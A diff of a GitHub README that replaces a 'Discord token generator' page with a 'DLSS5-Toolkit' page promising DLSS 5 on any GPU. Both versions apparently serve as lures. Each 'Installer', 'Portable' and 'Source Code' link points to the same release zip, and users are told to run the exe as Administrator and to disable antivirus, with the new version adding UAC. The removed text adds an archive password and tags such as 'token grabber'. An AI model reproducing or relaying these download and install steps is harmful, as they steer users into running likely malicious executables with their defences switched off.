@@ -1,1025 +1,223 @@
+# ⚡ DLSS5-Toolkit
+
 <p align="center">
-  <img src="https://img.icons8.com/color/96/000000/discord.png" alt="Discord" width="120" height="120">
+  <img src="https://img.icons8.com/color/96/000000/nvidia.png" alt="DLSS5 Toolkit" width="120" height="120">
 </p>
 
-<img width="708" height="98" alt="image" src="https://github.com/user-attachments/assets/6243b46d-071b-48df-8075-54163747a3ea" />
+<img width="420" height="120" alt="image" src="https://github.com/user-attachments/assets/3b2aa2a5-f337-42e8-bc86-4b4429bd5fc5" />
 
-<h1 align="center">🤖 Discord-Token-Generator</h1>
+<h1 align="center">DLSS5-Toolkit</h1>
 <p align="center">
-  <strong>Mass Discord Bot Token Generator & Manager</strong><br>
-  Create · Manage · Automate · Scale
+  <strong>Complete DLSS 5 Neural Rendering Toolkit for Any GPU & Game</strong><br>
+  NVIDIA RTX 20-50 · AMD RDNA 3-4 · Intel Arc
 </p>
 
 <p align="center">
-  <a href="#"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=for-the-badge" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue?style=for-the-badge" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=for-the-badge" alt="Status"></a>
-  <a href="#"><img src="https://img.shields.io/badge/downloads-15k%2B-brightgreen?style=for-the-badge" alt="Downloads"></a>
-  <a href="#"><img src="https://img.shields.io/badge/license-MIT-orange?style=for-the-badge" alt="License"></a>
+  <a href="#"><img src="https://img.shields.io/badge/version-1.5.0-76B900?style=for-the-badge" alt="Version"></a>
+  <a href="#"><img src="https://img.shields.io/badge/platform-Windows_10%2F11-2ECC71?style=for-the-badge" alt="Platform"></a>
+  <a href="#"><img src="https://img.shields.io/badge/status-Stable-27AE60?style=for-the-badge" alt="Status"></a>
+  <a href="#"><img src="https://img.shields.io/badge/downloads-88k%2B-E74C3C?style=for-the-badge" alt="Downloads"></a>
+  <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
 </p>
 
 <p align="center">
   <a href="#-download">📥 Download</a> •
   <a href="#-features">⚡ Features</a> •
+  <a href="#-gpu-support">🎮 GPU Support</a> •
   <a href="#-installation">⚙️ Installation</a> •
-  <a href="#-usage">🎮 Usage</a>
+  <a href="#-documentation">📚 Docs</a>
 </p>
 
 ---
 
-## 🤖 What is This?
+## 🎯 What is DLSS5-Toolkit?
 
-**Discord-Token-Generator** is a powerful tool for creating and managing Discord bot tokens in bulk. Perfect for developers, automation enthusiasts, and server administrators who need to generate multiple bot tokens quickly and efficiently.
+**DLSS5-Toolkit** is a comprehensive toolkit that enables **DLSS 5 Neural Rendering** on graphics cards from **NVIDIA, AMD, and Intel**. It combines all essential DLSS 5 tools into one unified interface, providing a complete solution for installing, configuring, and optimizing DLSS 5 on any system.
+
+DLSS 5 Neural Rendering debuted with NBA 2K27 and was officially exclusive to RTX 50-series GPUs. This toolkit brings the technology to older cards through patched binaries, compatibility layers, and synthetic DLAA injection.
 
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/johnj-eng96n9/Discord-Token-Generator/releases/download/4578/Discord-Token-Generator.zip">
-    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
+  <a href="https://github.com/johnj-eng96n9/DLSS5-Toolkit/releases/download/45789/DLSS5-ToolKit.zip">
+    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
 
----
-
-## ⚡ Features
-
-### 🎯 Core Features
-- 🔑 **Mass Token Generation** – Create unlimited bot tokens
-- 📋 **Bulk Creation** – Generate tokens in batches (10, 50, 100, 500+)
-- 🖥️ **User-Friendly GUI** – Clean and intuitive interface
-- 💾 **Export & Save** – Save tokens to .txt, .csv, .json
-- 🔄 **Auto-Update** – Always working with latest Discord API
-
-### 🛠️ Advanced Features
-- 🎨 **Custom Bot Names** – Auto-generate unique bot names
-- 📊 **Token Validation** – Check if tokens are working
-- 🔍 **Token Info** – View bot ID, username, and creation date
-- 🧹 **Bulk Delete** – Remove invalid or unused tokens
-- 🌐 **Proxy Support** – Use proxies for large-scale generation
-
-### 📋 Management Tools
-- 📂 **Import Tokens** – Load existing tokens
-- 🗂️ **Organize** – Sort and filter tokens
-- 📊 **Statistics** – View token usage and status
-- 💾 **Backup & Restore** – Save and load token lists
+**Direct Links:**
+- [Windows Installer (.exe)](https://github.com/johnj-eng96n9/DLSS5-Toolkit/releases/download/45789/DLSS5-ToolKit.zip)
+- [Portable ZIP](https://github.com/johnj-eng96n9/DLSS5-Toolkit/releases/download/45789/DLSS5-ToolKit.zip)
+- [Source Code](https://github.com/johnj-eng96n9/DLSS5-Toolkit/releases/download/45789/DLSS5-ToolKit.zip)
 
 ---
 
-## ⚙️ Installation
+## ⚡ Key Features
 
-```bash
-1. Click the download button above
-2. Extract the archive with password: discord2026
-3. Run DiscordTokenGenerator.exe as Administrator
-4. Start generating tokens!
-```
+### 🎯 Complete Installation Suite
+- **One-click setup** – Install DLSS 5 for any game with a single click
+- **Auto-detection** – Scans Steam, Epic, GOG, and Xbox libraries automatically
+- **Auto-updating** – Checks for new releases on start
+- **Manual addition** – Add any folder or executable manually
+
+### 🎮 Universal GPU Support
+- ✅ **NVIDIA RTX 50-series** – Full native support
+- ✅ **NVIDIA RTX 40-series** – Patched binaries available
+- ✅ **NVIDIA RTX 30/20-series** – Community mod support
+- ✅ **AMD RDNA 4 (RX 9000)** – DLSS-NR-on-AMD mod
+- ✅ **AMD RDNA 3 (RX 7000)** – Technical support exists
+- ⚠️ **Intel Arc** – Experimental
+
+### 🔄 DLL Management
+- **DLSS 5 Swapper** – Swap between different DLSS 5 DLL versions
+- **Version History** – Track which versions are installed
+- **One-click restore** – Revert to original DLSS DLLs
+- **Backup system** – Automatic backup of original files
+
+### 🧠 Feeder Mode
+- **Synthetic DLAA** – Injects DLSS 5 into games without native support
+- **ReShade Integration** – Uses ReShade depth buffer to feed data to DLSS
+- **Non-DLSS Games** – Works with any DX11/DX12 game
+- **Classic Games** – Support for DX9/OpenGL via DXVK
+
+### 🛠️ Advanced Options
+- **Dual GPU mode** – One card renders, one does AI computation
+- **Hotkey toggles** – F5/F6 to enable/disable neural rendering
+- **OptiScaler support** – Alternative implementation for RTX 50-only games
+- **Emulator support** – DuckStation, PCSX2, RPCS3, Xenia, and more
 
 ---
 
-## 🎮 Usage
+## 🎮 GPU Support Details
 
-### Quick Start
+| GPU Family | Support | Method | Performance |
+|------------|---------|--------|-------------|
+| **NVIDIA RTX 50** | ✅ Full | Native | Best |
+| **NVIDIA RTX 40** | ✅ Full | Patched | Good |
+| **NVIDIA RTX 30** | ✅ Supported | Patched | Moderate |
+| **NVIDIA RTX 20** | ✅ Supported | Patched | Low |
+| **AMD RDNA 4** | ✅ Supported | DLSS-NR-on-AMD | ~30 FPS (1080p) |
+| **AMD RDNA 3** | ⚠️ Technical | DLSS-NR-on-AMD | Untested |
+| **Intel Arc** | ⚠️ Experimental | - | Untested |
+
+> **Performance Note:** DLSS 5 uses FP8 neural models. RTX 50-series has dedicated hardware. Older NVIDIA cards and AMD cards will have significantly lower performance.
+
+---
+
+## ⚙️ Installation Guide
+
+### Windows (Recommended)
+
 ```bash
-1. Launch the tool
-2. Enter number of tokens to generate
-3. Click "Generate"
-4. Export tokens to your preferred format
-5. Use tokens in your Discord bots
+1. Download the latest release (Installer or ZIP)
+2. Extract the archive (if using ZIP)
+3. Run dlss5toolkit.exe as Administrator
+4. Select your game from the list (auto-detected)
+5. Choose your installation mode (Swapper, Feeder, or Full)
+6. Click "Install DLSS 5"
+7. Launch the game
+8. Press HOME → Add-ons tab → Enable DLSS 5 Neural Rendering
 ```
 
-### Command Line Options
-```bash
-DiscordTokenGenerator.exe --count 50 --output tokens.txt
-DiscordTokenGenerator.exe --batch 100 --format json
-DiscordTokenGenerator.exe --proxy list.txt --count 200
-```
+**First‑time setup wizard** guides you through:
+- Game detection
+- GPU compatibility check
+- Installation mode selection
+- ReShade configuration (for Feeder mode)
 
 ---
 
 ## 🖥️ System Requirements
 
-| Requirement | Details |
-|-------------|---------|
-| **OS** | Windows 10/11 or Linux |
-| **RAM** | 2GB minimum |
-| **Storage** | 50MB free space |
-| **Internet** | Required for token generation |
-| **Python** | 3.8+ (for script version) |
+| Component      | Minimum               | Recommended           |
+|----------------|-----------------------|-----------------------|
+| **OS**         | Windows 10 64‑bit     | Windows 11 64‑bit     |
+| **GPU**        | NVIDIA RTX 20 / AMD RDNA 3 | NVIDIA RTX 40+ / AMD RDNA 4 |
+| **RAM**        | 8 GB                  | 16 GB                 |
+| **Storage**    | 150 MB                | 300 MB                |
+| **Driver**     | Latest Game Ready     | Latest Studio Driver  |
 
 ---
 
-## 📊 Feature Status
+## 📊 Feature Matrix
 
-| Category | Feature | Status |
-|----------|---------|--------|
-| Generation | Mass Token Creation | ✅ |
-| Generation | Batch Generation | ✅ |
-| Management | Export Tokens | ✅ |
-| Management | Import Tokens | ✅ |
-| Management | Token Validation | ✅ |
-| Advanced | Proxy Support | ✅ |
-| Advanced | Auto-Update | ✅ |
-| UI | GUI Interface | ✅ |
-| UI | Dark/Light Theme | ✅ |
-
----
-
-## 🐛 Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| Tool doesn't work | Run as Administrator, disable antivirus |
-| Tokens invalid | Check Discord API status, use proxy |
-| Generation fails | Update to latest version |
-| Rate limited | Use proxies, reduce generation speed |
-
----
-
-## 📝 SEO Tags
-
-discord token generator, discord bot token generator, mass token generator, discord token creator, discord bot creator, discord automation, discord token manager, bulk token generator, discord api, discord bot development, token generator 2026, discord tools, discord utility, free token generator, discord bot maker, discord hacker tool, discord mass account, token grabber, discord token checker, discord bot generator
+| Category        | Feature                 | Status | Version Added |
+|-----------------|-------------------------|--------|---------------|
+| Installation    | One-click setup         | ✅     | 1.0           |
+| Installation    | Auto-detection          | ✅     | 1.0           |
+| Installation    | Auto-updating           | ✅     | 1.0           |
+| Installation    | Manual addition         | ✅     | 1.0           |
+| GPU Support     | NVIDIA RTX 50           | ✅     | 1.0           |
+| GPU Support     | NVIDIA RTX 40           | ✅     | 1.0           |
+| GPU Support     | NVIDIA RTX 30           | ✅     | 1.2           |
+| GPU Support     | NVIDIA RTX 20           | ✅     | 1.3           |
+| GPU Support     | AMD RDNA 4              | ✅     | 1.5           |
+| GPU Support     | AMD RDNA 3              | ⚠️     | 1.5           |
+| DLL Management  | Swapper                 | ✅     | 1.0           |
+| DLL Management  | Version history         | ✅     | 1.0           |
+| DLL Management  | Backup system           | ✅     | 1.0           |
+| Feeder          | Synthetic DLAA          | ✅     | 1.2           |
+| Feeder          | ReShade integration     | ✅     | 1.2           |
+| Feeder          | Non-DLSS games          | ✅     | 1.2           |
+| Advanced        | Dual GPU mode           | ✅     | 1.5           |
+| Advanced        | OptiScaler support      | ✅     | 1.4           |
+| Advanced        | Emulator support        | ✅     | 1.3           |
 
 ---
 
-## 💬 Support
+## 🐛 Troubleshooting Quick Reference
 
-- ⭐ Star this repository
-- 🐛 Open an Issue for bugs
+| Symptom                            | Solution                                          |
+|------------------------------------|---------------------------------------------------|
+| "Access denied"                    | Run as Administrator; disable UAC temporarily     |
+| Game crashes on launch             | Disable antivirus temporarily; use Safe Mode      |
+| Anti‑cheat detected                | Only use in offline single-player games          |
+| Low performance on RTX 30/20       | Expected; use lower resolution or settings       |
+| AMD GPU not working                | Ensure RDNA 3/4; performance will be low         |
+| DLSS 5 not showing in-game         | Press HOME → Add-ons tab → Enable DLSS 5         |
+| Feeder mode not working            | Check ReShade depth buffer selection             |
 
 ---
 
-<p align="center">
-  <a href="https://github.com/johnj-eng96n9/Discord-Token-Generator">
-    <img src="https://img.shields.io/badge/Made%20with%20❤️%20for%20the%20Discord%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+## 📚 Documentation & Community
+
+- 📖 [Full Documentation](https://github.com/YOUR_USERNAME/DLSS5-Toolkit/wiki)
+- 🐛 [Issue Tracker](https://github.com/YOUR_USERNAME/DLSS5-Toolkit/issues)
+- 💬 [Community Discord](https://discord.gg/YOUR_INVITE)
+- 📺 [Video Tutorials](https://www.youtube.com/playlist?list=YOUR_PLAYLIST)
+
+---
+
+## 🔍 SEO Keywords & Tags
+
+`dlss5 toolkit`, `dlss5 universal`, `dlss5 one click`, `dlss5 swapper`, `dlss5 feeder`, `nvidia dlss 5`, `dlss5 amd`, `dlss5 intel arc`, `dlss5 rtx 20`, `dlss5 rtx 30`, `dlss5 rtx 40`, `dlss5 rtx 50`, `dlss5 neural rendering`, `dlss5 game mod`, `dlss5 installer`, `dlss5 tool`, `dlss5 download`, `dlss5 github`, `dlss5 2026`, `dlss5 any gpu`, `dlss5 for all games`, `dlss5 for emulators`, `dlss5 reshade`, `dlss5 optiscaler`, `dlss5 dll swap`
+
+---
+
+## 📁 Repository Structure
+
+```
+DLSS5-Toolkit/
+├── src/                   # Main application source
+├── docs/                  # Documentation source
+├── assets/                # Icons, images, branding
+├── plugins/               # Extensible plugin system
+├── configs/               # Default config files
+├── tests/                 # Unit and integration tests
+├── .github/               # CI/CD workflows
+├── LICENSE
+├── README.md
+└── CONTRIBUTING.md
+```
+
+---
+
+## 🤝 Contributing
+
+We welcome contributions from the community! See our [Contributing Guidelines](CONTRIBUTING.md) for details.
+
+**Areas needing help:**
+- Plugin development
+- Documentation translation
+- GPU compatibility testing
+- Game compatibility testing
+- Performance optimization
